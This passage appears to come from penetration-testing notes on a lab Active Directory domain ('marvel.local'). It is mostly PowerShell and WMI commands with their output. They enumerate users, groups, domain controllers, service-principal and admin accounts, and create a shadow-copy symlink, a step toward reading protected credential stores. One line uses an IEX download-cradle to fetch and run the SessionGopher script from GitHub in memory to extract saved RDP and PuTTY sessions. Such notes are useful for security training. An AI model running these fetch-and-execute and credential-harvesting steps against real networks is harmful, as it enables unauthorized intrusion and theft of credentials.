__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1
                   3,Mask="255.255.255.255",NextHop="0.0.0.0"
Age              : 14842
Caption          : 255.255.255.255
Description      : 255.255.255.255 - 255.255.255.255 - 0.0.0.0
Destination      : 255.255.255.255
Information      : 0.0
InstallDate      :
InterfaceIndex   : 13
Mask             : 255.255.255.255
Metric1          : 281
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 255.255.255.255
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN
```


Enumerate user in Domain and Trusted domain
```
PS C:\Users\pparker> Get-WmiObject -Class  Win32_USerAccount


AccountType : 512
Caption     : SPIDERMAN\Administrator
Domain      : SPIDERMAN
SID         : S-1-5-21-1600661046-3385568014-3685991882-500
FullName    :
Name        : Administrator

AccountType : 512
Caption     : SPIDERMAN\DefaultAccount
Domain      : SPIDERMAN
SID         : S-1-5-21-1600661046-3385568014-3685991882-503
FullName    :
Name        : DefaultAccount

AccountType : 512
Caption     : SPIDERMAN\Guest
Domain      : SPIDERMAN
SID         : S-1-5-21-1600661046-3385568014-3685991882-501
FullName    :
Name        : Guest

AccountType : 512
Caption     : SPIDERMAN\Peter
Domain      : SPIDERMAN
SID         : S-1-5-21-1600661046-3385568014-3685991882-1001
FullName    :
Name        : Peter

AccountType : 512
Caption     : SPIDERMAN\WDAGUtilityAccount
Domain      : SPIDERMAN
SID         : S-1-5-21-1600661046-3385568014-3685991882-504
FullName    :
Name        : WDAGUtilityAccount

AccountType : 512
Caption     : MARVEL\Administrator
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-500
FullName    :
Name        : Administrator

AccountType : 512
Caption     : MARVEL\Guest
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-501
FullName    :
Name        : Guest

AccountType : 512
Caption     : MARVEL\krbtgt
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-502
FullName    :
Name        : krbtgt

AccountType : 512
Caption     : MARVEL\DefaultAccount
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-503
FullName    :
Name        : DefaultAccount

AccountType : 512
Caption     : MARVEL\fcastle
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-1103
FullName    : Frank Castle
Name        : fcastle

AccountType : 512
Caption     : MARVEL\pparker
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-1105
FullName    : Peter Parker
Name        : pparker

AccountType : 512
Caption     : MARVEL\spn1
Domain      : MARVEL
SID         : S-1-5-21-1806573636-3987246654-2051155295-1109
FullName    :
Name        : spn1

```


Enumerate groups in Domain and Trusted Domains
```
PS C:\Users\pparker> Get-WmiObject -Class Win32_Group
Caption                                        Domain    Name                                    SID
-------                                        ------    ----                                    ---
SPIDERMAN\Access Control Assistance Operators  SPIDERMAN Access Control Assistance Operators     S-1-5-32-579
SPIDERMAN\Administrators                       SPIDERMAN Administrators                          S-1-5-32-544
SPIDERMAN\Backup Operators                     SPIDERMAN Backup Operators                        S-1-5-32-551
SPIDERMAN\Cryptographic Operators              SPIDERMAN Cryptographic Operators                 S-1-5-32-569
SPIDERMAN\Device Owners                        SPIDERMAN Device Owners                           S-1-5-32-583
SPIDERMAN\Distributed COM Users                SPIDERMAN Distributed COM Users                   S-1-5-32-562
SPIDERMAN\Event Log Readers                    SPIDERMAN Event Log Readers                       S-1-5-32-573
SPIDERMAN\Guests                               SPIDERMAN Guests                                  S-1-5-32-546
SPIDERMAN\Hyper-V Administrators               SPIDERMAN Hyper-V Administrators                  S-1-5-32-578
SPIDERMAN\IIS_IUSRS                            SPIDERMAN IIS_IUSRS                               S-1-5-32-568
SPIDERMAN\Network Configuration Operators      SPIDERMAN Network Configuration Operators         S-1-5-32-556
SPIDERMAN\Performance Log Users                SPIDERMAN Performance Log Users                   S-1-5-32-559
SPIDERMAN\Performance Monitor Users            SPIDERMAN Performance Monitor Users               S-1-5-32-558
SPIDERMAN\Power Users                          SPIDERMAN Power Users                             S-1-5-32-547
SPIDERMAN\Remote Desktop Users                 SPIDERMAN Remote Desktop Users                    S-1-5-32-555
SPIDERMAN\Remote Management Users              SPIDERMAN Remote Management Users                 S-1-5-32-580
SPIDERMAN\Replicator                           SPIDERMAN Replicator                              S-1-5-32-552
SPIDERMAN\System Managed Accounts Group        SPIDERMAN System Managed Accounts Group           S-1-5-32-581
SPIDERMAN\Users                                SPIDERMAN Users                                   S-1-5-32-545
MARVEL\Cert Publishers                         MARVEL    Cert Publishers                         S-1-5-21-1...
MARVEL\RAS and IAS Servers                     MARVEL    RAS and IAS Servers                     S-1-5-21-1...
MARVEL\Allowed RODC Password Replication Group MARVEL    Allowed RODC Password Replication Group S-1-5-21-1...
MARVEL\Denied RODC Password Replication Group  MARVEL    Denied RODC Password Replication Group  S-1-5-21-1...
MARVEL\DnsAdmins                               MARVEL    DnsAdmins                               S-1-5-21-1...
MARVEL\Cloneable Domain Controllers            MARVEL    Cloneable Domain Controllers            S-1-5-21-1...
MARVEL\DnsUpdateProxy                          MARVEL    DnsUpdateProxy                          S-1-5-21-1...
MARVEL\Domain Admins                           MARVEL    Domain Admins                           S-1-5-21-1...
MARVEL\Domain Computers                        MARVEL    Domain Computers                        S-1-5-21-1...
MARVEL\Domain Controllers                      MARVEL    Domain Controllers                      S-1-5-21-1...
MARVEL\Domain Guests                           MARVEL    Domain Guests                           S-1-5-21-1...
MARVEL\Domain Users                            MARVEL    Domain Users                            S-1-5-21-1...
MARVEL\Enterprise Admins                       MARVEL    Enterprise Admins                       S-1-5-21-1...
MARVEL\Enterprise Key Admins                   MARVEL    Enterprise Key Admins                   S-1-5-21-1...
MARVEL\Enterprise Read-only Domain Controllers MARVEL    Enterprise Read-only Domain Controllers S-1-5-21-1...
MARVEL\Group Policy Creator Owners             MARVEL    Group Policy Creator Owners             S-1-5-21-1...
MARVEL\Key Admins                              MARVEL    Key Admins                              S-1-5-21-1...
MARVEL\Protected Users                         MARVEL    Protected Users                         S-1-5-21-1...
MARVEL\Read-only Domain Controllers            MARVEL    Read-only Domain Controllers            S-1-5-21-1...
MARVEL\Schema Admins                           MARVEL    Schema Admins                           S-1-5-21-1...
```

```
PS C:\Windows\system32> (Get-WmiObject -Class Win32_Shadowcopy -list).create("C:\", "ClientAccessible")


__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ReturnValue      : 0
ShadowID         : {637B9468-E33A-4F4E-8E30-7B374BC2E40B}
PSComputerName   :



PS C:\Windows\system32> $link = (Get-WmiObject -Class Win32_Shadowcopy).DeviceObject + "\"
PS C:\Windows\system32> cmd /c mklink /d C:\shadowcopy "$link"
symbolic link created for C:\shadowcopy <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
PS C:\Windows\system32>

```

Extract RDP, Putty sessions form Registry:

```
PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher                                         
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on Spiderman ...
Microsoft Remote Desktop (RDP) Sessions


Source   : Spiderman\pparker
Hostname : 192.168.22.211
Username : MARVEL\Administrator

```
# Active Directory Enumeration with WMIC

Current Domain Name
```
PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select -ExpandProperty ds_dc
marvel
PS C:\Users\pparker> Get-WmiObject -Class Win32_ComputerSystem |select -ExpandProperty Domain
marvel.local
````
Current Domain Info
```
PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_domain


__GENUS                                        : 2
__CLASS                                        : ds_domaindns
__SUPERCLASS                                   : ads_domaindns
__DYNASTY                                      : DS_LDAP_Root_Class
__RELPATH                                      : ds_domaindns.ADSIPath="LDAP://DC=marvel,DC=local"
__PROPERTY_COUNT                               : 178
__DERIVATION                                   : {ads_domaindns, ds_domain, ds_top, DS_LDAP_Root_Class}
__SERVER                                       : SPIDERMAN
__NAMESPACE                                    : root\directory\ldap
__PATH                                         : \\SPIDERMAN\root\directory\ldap:ds_domaindns.ADSIPath="LDAP:/
                                                 /DC=marvel,DC=local"
ADSIPath                                       : LDAP://DC=marvel,DC=local
DS_adminDescription                            :
DS_adminDisplayName                            :
DS_allowedAttributes                           :
DS_allowedAttributesEffective                  :
DS_allowedChildClasses                         :
DS_allowedChildClassesEffective                :
DS_auditingPolicy                              : System.Management.ManagementBaseObject
DS_bridgeheadServerListBL                      :
DS_builtinCreationTime                         :
DS_builtinModifiedCount                        :
DS_cACertificate                               :
DS_canonicalName                               :
DS_cn                                          :
DS_controlAccessRights                         :
DS_createTimeStamp                             :
DS_creationTime                                : 132234719871591031
DS_dc                                          : marvel
DS_defaultLocalPolicyObject                    :
DS_description                                 :
DS_desktopProfile                              :
DS_directReports                               :
DS_displayName                                 :
DS_displayNamePrintable                        :
DS_distinguishedName                           : DC=marvel,DC=local
DS_domainPolicyObject                          :
DS_domainReplica                               :
DS_dSASignature                                : System.Management.ManagementBaseObject
DS_dSCorePropagationData                       : {16010101000000.000000-000}
DS_eFSPolicy                                   :
DS_extensionName                               :
DS_flags                                       :
DS_forceLogoff                                 : -9223372036854775808
DS_fromEntry                                   :
DS_frsComputerReferenceBL                      :
DS_fRSMemberReferenceBL                        :
DS_fSMORoleOwner                               : CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-Na
                                                 me,CN=Sites,CN=Configuration,DC=marvel,DC=local
DS_gPLink                                      : [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies
                                                 ,CN=System,DC=marvel,DC=local;0]
DS_gPOptions                                   :
DS_instanceType                                : 5
DS_isCriticalSystemObject                      : True
DS_isDeleted                                   :
DS_isPrivilegeHolder                           :
DS_isRecycled                                  :
DS_lastKnownParent                             :
DS_lockoutDuration                             : -18000000000
DS_lockOutObservationWindow                    : -18000000000
DS_lockoutThreshold                            : 0
DS_lSACreationTime                             :
DS_lSAModifiedCount                            :
DS_managedBy                                   :
DS_managedObjects                              :
DS_masteredBy                                  : {CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-N
                                                 ame,CN=Sites,CN=Configuration,DC=marvel,DC=local}
DS_maxPwdAge                                   : -36288000000000
DS_memberOf                                    :
DS_minPwdAge                                   : -864000000000
DS_minPwdLength                                : 7
DS_modifiedCount                               : 1
DS_modifiedCountAtLastProm                     : 0
DS_modifyTimeStamp                             :
DS_mS_DS_ConsistencyChildCount                 :
DS_mS_DS_ConsistencyGuid                       :
DS_ms_DS_MachineAccountQuota                   : 10
DS_msCOM_PartitionSetLink                      :
DS_msCOM_UserLink                              :
DS_msDFSR_ComputerReferenceBL                  :
DS_msDFSR_MemberReferenceBL                    :
DS_msDS_AllowedDNSSuffixes                     :
DS_msDS_AllUsersTrustQuota                     : 1000
DS_msDS_Approx_Immed_Subordinates              :
DS_msDS_AuthenticatedToAccountlist             :
DS_msDS_Behavior_Version                       : 7
DS_msDS_ClaimSharesPossibleValuesWithBL        :
DS_msDS_CloudAnchor                            :
DS_msDS_EnabledFeature                         :
DS_msDS_EnabledFeatureBL                       :
DS_msDS_ExpirePasswordsOnSmartCardOnlyAccounts : True
DS_msDS_HostServiceAccountBL                   :
DS_msDS_IsDomainFor                            : {CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-N
                                                 ame,CN=Sites,CN=Configuration,DC=marvel,DC=local}
DS_msDS_IsFullReplicaFor                       :
DS_msDS_IsPartialReplicaFor                    :
DS_msDS_IsPrimaryComputerFor                   :
DS_msDS_KrbTgtLinkBl                           :
DS_msDS_LastKnownRDN                           :
DS_msDS_LocalEffectiveDeletionTime             :
DS_msDS_LocalEffectiveRecycleTime              :
DS_msDS_LogonTimeSyncInterval                  :
DS_msDs_masteredBy                             : {CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-N
                                                 ame,CN=Sites,CN=Configuration,DC=marvel,DC=local}
DS_msds_memberOfTransitive                     :
DS_msDS_MembersForAzRoleBL                     :
DS_msDS_MembersOfResourcePropertyListBL        :
DS_msds_memberTransitive                       :
DS_msDS_NC_RO_Replica_Locations_BL             :
DS_msDS_NCReplCursors                          :
DS_msDS_NCReplInboundNeighbors                 :
DS_msDS_NCReplOutboundNeighbors                :
DS_msDS_NcType                                 : 0
DS_msDS_NonMembersBL                           :
DS_msDS_ObjectReferenceBL                      :
DS_msDS_ObjectSoa                              :
DS_msDS_OIDToGroupLinkBl                       :
DS_msDS_OperationsForAzRoleBL                  :
DS_msDS_OperationsForAzTaskBL                  :
DS_msDS_parentdistname                         :
DS_msDS_PerUserTrustQuota                      : 1
DS_msDS_PerUserTrustTombstonesQuota            : 10
DS_msDS_PrincipalName                          :
DS_msDS_PSOApplied                             :
DS_msDS_ReplAttributeMetaData                  :
DS_msDS_ReplValueMetaData                      :
DS_msDS_ReplValueMetaDataExt                   :
DS_msDS_RevealedDSAs                           :
DS_msDS_RevealedListBL                         :
DS_msDS_SourceAnchor                           :
DS_msDS_TasksForAzRoleBL                       :
DS_msDS_TasksForAzTaskBL                       :
DS_msDS_TDOEgressBL                            :
DS_msDS_TDOIngressBL                           :
DS_msDS_USNLastSyncSuccess                     :
DS_msDS_ValueTypeReferenceBL                   :
DS_msSFU30PosixMemberOf                        :
DS_name                                        : marvel
DS_nETBIOSName                                 :
DS_netbootSCPBL                                :
DS_nextRid                                     : 1000
DS_nonSecurityMemberBL                         :
DS_nTMixedDomain                               : 0
DS_nTSecurityDescriptor                        : System.Management.ManagementBaseObject
DS_objectCategory                              : CN=Domain-DNS,CN=Schema,CN=Configuration,DC=marvel,DC=local
DS_objectClass                                 : {top, domain, domainDNS}
DS_objectGUID                                  : System.Management.ManagementBaseObject
DS_objectSid                                   : System.Management.ManagementBaseObject
DS_objectVersion                               :
DS_oEMInformation                              :
DS_otherWellKnownObjects                       : {System.Management.ManagementBaseObject,
                                                 System.Management.ManagementBaseObject}
DS_ownerBL                                     :
DS_partialAttributeDeletionList                :
DS_partialAttributeSet                         :
DS_pekKeyChangeInterval                        :
DS_pekList                                     :
DS_possibleInferiors                           :
DS_privateKey                                  :
DS_proxiedObjectName                           :
DS_proxyAddresses                              :
DS_pwdHistoryLength                            : 24
DS_pwdProperties                               : 1
DS_queryPolicyBL                               :
DS_replicaSource                               :
DS_replPropertyMetaData                        :
DS_replUpToDateVector                          :
DS_repsFrom                                    :
DS_repsTo                                      :
DS_revision                                    :
DS_rIDManagerReference                         : CN=RID Manager$,CN=System,DC=marvel,DC=local
DS_sDRightsEffective                           :
DS_serverReferenceBL                           :
DS_serverRole                                  :
DS_serverState                                 : 1
DS_showInAdvancedViewOnly                      :
DS_siteObjectBL                                :
DS_structuralObjectClass                       :
DS_subRefs                                     : {DC=ForestDnsZones,DC=marvel,DC=local,
                                                 DC=DomainDnsZones,DC=marvel,DC=local,
                                                 CN=Configuration,DC=marvel,DC=local}
DS_subSchemaSubEntry                           :
DS_systemFlags                                 : -1946157056
DS_treeName                                    :
DS_uASCompat                                   : 1
DS_url                                         :
DS_uSNChanged                                  : 69650
DS_uSNCreated                                  : 4099
DS_uSNDSALastObjRemoved                        :
DS_USNIntersite                                :
DS_uSNLastObjRem                               :
DS_uSNSource                                   :
DS_wbemPath                                    :
DS_wellKnownObjects                            : {System.Management.ManagementBaseObject,
                                                 System.Management.ManagementBaseObject,
                                                 System.Management.ManagementBaseObject,
                                                 System.Management.ManagementBaseObject...}
DS_whenChanged                                 : 20200114023947.000000-480
DS_whenCreated                                 : 20191230035758.000000-480
DS_wWWHomePage                                 :
PSComputerName                                 : SPIDERMAN
```

DC for Current box:

```
PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | Where-Object {$_.ds_userAccountControl -eq 532480} |select -ExpandProperty ds_cn                                                                                                                        
HYDRA

```


Computers in current Domain

```
PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  ds_cn

ds_cn
-----
HYDRA
PUNISHER
DESKTOP-DGQM4HL
SPODERMAN
SPIDERMAN
```
Current Domain info
```
PS C:\Users\pparker> (Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | Where-Object {$_.ds_userAccountControl -eq 532480}).Properties | Foreach-Object {If($_.value -AND $_.name -notmatch "__"){@{ $($_.name) = $($_.value)}}}

Name                           Value
----                           -----
ADSIPath                       LDAP://CN=HYDRA,OU=Domain Controllers,DC=marvel,DC=local
DS_accountExpires              9223372036854775807
DS_cn                          HYDRA
DS_distinguishedName           CN=HYDRA,OU=Domain Controllers,DC=marvel,DC=local
DS_dNSHostName                 HYDRA.marvel.local
DS_dSCorePropagationData       {20191230035857.000000-480, 16010101000001.000000-000}
DS_instanceType                4
DS_isCriticalSystemObject      True
DS_lastLogon                   132234720331123278
DS_lastLogonTimestamp          132231758269911528
DS_logonCount                  96
DS_msDFSR_ComputerReferenceBL  CN=HYDRA,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=Syste...
DS_msDS_GenerationId           System.Management.ManagementBaseObject
DS_msDS_SupportedEncryption... 28
DS_name                        HYDRA
DS_nTSecurityDescriptor        System.Management.ManagementBaseObject
DS_objectCategory              CN=Computer,CN=Schema,CN=Configuration,DC=marvel,DC=local
DS_objectClass                 {top, person, organizationalPerson, user...}
DS_objectGUID                  System.Management.ManagementBaseObject
DS_objectSid                   System.Management.ManagementBaseObject
DS_operatingSystem             Windows Server 2016 Standard Evaluation
DS_operatingSystemVersion      10.0 (14393)
DS_primaryGroupID              516
DS_pwdLastSet                  132221807628573590
DS_rIDSetReferences            CN=RID Set,CN=HYDRA,OU=Domain Controllers,DC=marvel,DC=local
DS_sAMAccountName              HYDRA$
DS_sAMAccountType              805306369
DS_serverReferenceBL           CN=HYDRA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=...
DS_servicePrincipalName        {TERMSRV/HYDRA, TERMSRV/HYDRA.marvel.local, Dfsr-12F9A27C-BF97-4787-9364-D31...
DS_userAccountControl          532480
DS_uSNChanged                  69670
DS_uSNCreated                  12293
DS_whenChanged                 20200114030056.000000-480
DS_whenCreated                 20191230035857.000000-480
```


# Useful Powershell

Looking for SPN's (works only with activedirectory module)
```
PS C:\Users\Administrator>  get-aduser -filter {ServicePrincipalName -like "*"} -Properties PasswordLastSet,LastLogonDat
e,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation


DistinguishedName          : CN=krbtgt,CN=Users,DC=marvel,DC=local
Enabled                    : False
GivenName                  :
LastLogonDate              :
Name                       : krbtgt
ObjectClass                : user
ObjectGUID                 : dac1e75e-809d-4c80-ba08-1dfbb915f4f2
PasswordLastSet            : 12/30/2019 3:58:57 AM
SamAccountName             : krbtgt
ServicePrincipalName       : {kadmin/changepw}
SID                        : S-1-5-21-1806573636-3987246654-2051155295-502
Surname                    :
TrustedForDelegation       : False
TrustedToAuthForDelegation : False
UserPrincipalName          :

DistinguishedName          : CN=spn1,CN=Users,DC=marvel,DC=local
Enabled                    : True
GivenName                  :
LastLogonDate              : 1/7/2020 2:06:56 AM
Name                       : spn1
ObjectClass                : user
ObjectGUID                 : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
PasswordLastSet            : 1/7/2020 12:31:28 AM
SamAccountName             : spn1
ServicePrincipalName       : {http/hydra.marvel.local:80}
SID                        : S-1-5-21-1806573636-3987246654-2051155295-1109
Surname                    :
TrustedForDelegation       : False
TrustedToAuthForDelegation : False
UserPrincipalName          :
```

Looking for Admin accounts (works only with activedirectory module)

```
PS C:\Users\Administrator> get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf


AdminCount        : 1
DistinguishedName : CN=Administrator,CN=Users,DC=marvel,DC=local
Enabled           : True
GivenName         :
LastLogonDate     : 12/30/2019 12:29:41 PM
MemberOf          : {CN=Group Policy Creator Owners,CN=Users,DC=marvel,DC=local, CN=Domain Admins,CN=Users,DC=marvel,DC=local, CN=Enterprise Admins,CN=Users,DC=marvel,DC=local, CN=Schema Admins,CN=Users,DC=marvel,DC=local...}
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 75fffaa5-a4f3-4da1-8b63-2f1b8fdf3581
PasswordLastSet   : 12/30/2019 1:29:57 AM
SamAccountName    : Administrator
SID               : S-1-5-21-1806573636-3987246654-2051155295-500
Surname           :
UserPrincipalName :

AdminCount           : 1
DistinguishedName    : CN=krbtgt,CN=Users,DC=marvel,DC=local
Enabled              : False
GivenName            :
LastLogonDate        :
MemberOf             : {CN=Denied RODC Password Replication Group,CN=Users,DC=marvel,DC=local}
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : dac1e75e-809d-4c80-ba08-1dfbb915f4f2
PasswordLastSet      : 12/30/2019 3:58:57 AM
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-1806573636-3987246654-2051155295-502
Surname              :
UserPrincipalName    :

AdminCount           : 1
DistinguishedName    : CN=spn1,CN=Users,DC=marvel,DC=local
Enabled              : True
GivenName            :
LastLogonDate        : 1/7/2020 2:06:56 AM
MemberOf             : {CN=Domain Admins,CN=Users,DC=marvel,DC=local}
Name                 : spn1
ObjectClass          : user
ObjectGUID           : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
PasswordLastSet      : 1/7/2020 12:31:28 AM
SamAccountName       : spn1
ServicePrincipalName : {http/hydra.marvel.local:80}
SID                  : S-1-5-21-1806573636-3987246654-2051155295-1109
Surname              :
UserPrincipalName    :
```
